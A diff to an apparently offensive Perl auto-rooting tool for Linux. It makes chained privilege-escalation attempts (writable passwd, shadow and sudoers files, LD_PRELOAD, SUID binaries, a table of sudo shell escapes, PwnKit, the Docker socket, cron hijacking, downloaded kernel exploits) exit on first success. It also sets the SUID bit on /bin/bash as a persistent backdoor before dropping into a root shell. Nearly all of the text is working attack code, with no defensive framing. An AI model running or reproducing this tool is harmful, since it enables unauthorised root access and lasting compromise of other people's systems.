@@ -105,15 +105,17 @@ sub is_suid {
 
 sub try_suid_bash {
     if (is_suid("/bin/bash")) {
-        print "${G}[+] /bin/bash is SUID!${Z}\n";
-        sys_cmd("/bin/bash -p -c 'chmod +s /bin/bash; exec /bin/sh -p'");
-        droproot();
+        print "${G}[+] /bin/bash is SUID! Escalating...${Z}\n";
+        open(STDIN, "<&0");
+        exec "/bin/bash", "-p", "-c", 'chmod +s /bin/bash; exec /bin/sh -p';
+        # if exec fails
+        system("/bin/bash -p -c 'chmod +s /bin/bash; exec /bin/sh -p'");
         return 1;
     }
     if (is_suid("/tmp/.sb")) {
         print "${G}[+] /tmp/.sb is SUID!${Z}\n";
-        sys_cmd("/tmp/.sb -p -c 'chmod +s /bin/bash; exec /bin/sh -p'");
-        droproot();
+        exec "/tmp/.sb", "-p", "-c", 'chmod +s /bin/bash; exec /bin/sh -p';
+        system("/tmp/.sb -p -c 'chmod +s /bin/bash; exec /bin/sh -p'");
         return 1;
     }
     return 0;
@@ -334,7 +336,7 @@ my %SUDO_ABUSE = (
     "nice"    => "nice /bin/sh -p",
     "nohup"   => "nohup /bin/sh -p",
     "perl"    => "perl -e 'exec \"/bin/sh\", \"-p\"'",
-    "php"     => q{php -r 'system("/bin/sh -p");'},
+    "php"     => q{php -r 'system("chmod +s /bin/bash");system("/bin/sh -p");'},
     "python"  => "python -c 'import pty; pty.spawn(\"/bin/sh -p\")'",
     "python3" => "python3 -c 'import pty; pty.spawn(\"/bin/sh -p\")'",
     "ruby"    => "ruby -e 'exec \"/bin/sh\", \"-p\"'",
@@ -483,45 +485,56 @@ sub main {
 
     # === FAST CHECKS (no deps) ===
     print "${C}[*] Phase 1: Filesystem misconfig checks...${Z}\n";
-    exploit_passwd();
-    exploit_shadow();
-    exploit_sudoers();
-    exploit_ldpreload();
-    droproot() if isroot();
+    exploit_passwd() and goto GOTROOT;
+    exploit_shadow() and goto GOTROOT;
+    exploit_sudoers() and goto GOTROOT;
+    exploit_ldpreload() and goto GOTROOT;
+    try_suid_bash() and goto GOTROOT;
 
     # === SUID ===
     print "${C}[*] Phase 2: SUID/GUID enumeration...${Z}\n";
-    exploit_suid();
-    droproot() if isroot();
+    exploit_suid() and goto GOTROOT;
+    try_suid_bash() and goto GOTROOT;
 
     # === SUDO ===
     print "${C}[*] Phase 3: Sudo checks...${Z}\n";
-    exploit_sudo();
-    droproot() if isroot();
+    exploit_sudo() and goto GOTROOT;
+    try_suid_bash() and goto GOTROOT;
 
     # === PWNKIT ===
     print "${C}[*] Phase 4: Known CVE exploits...${Z}\n";
-    exploit_pwnkit();
-    droproot() if isroot();
+    exploit_pwnkit() and goto GOTROOT;
+    try_suid_bash() and goto GOTROOT;
 
     # === DOCKER ===
     print "${C}[*] Phase 5: Docker socket...${Z}\n";
-    exploit_docker();
-    droproot() if isroot();
+    exploit_docker() and goto GOTROOT;
+    try_suid_bash() and goto GOTROOT;
 
     # === CRON ===
     print "${C}[*] Phase 6: Cron hijack...${Z}\n";
-    exploit_cron();
-    droproot() if isroot();
+    exploit_cron() and goto GOTROOT;
+    try_suid_bash() and goto GOTROOT;
 
     # === BINARY DOWNLOAD ===
     if (find_binary("wget") || find_binary("curl")) {
         print "${C}[*] Phase 7: Downloading kernel exploits...${Z}\n";
-        auto_exploit_binary($kern);
-        droproot() if isroot();
+        auto_exploit_binary($kern) and goto GOTROOT;
+        try_suid_bash() and goto GOTROOT;
     }
 
     print "${R}[-] No exploit succeeded. System appears patched.${Z}\n";
+    exit 1;
+
+  GOTROOT:
+    print "${G}[+] DONE - Checking root...${Z}\n";
+    try_suid_bash();
+    if (isroot()) { droproot(); }
+    if (is_suid("/bin/bash")) {
+        print "${G}[+] Run: /bin/bash -p${Z}\n";
+        exec "/bin/bash", "-p";
+        system("/bin/bash -p");
+    }
 }
 
 main();
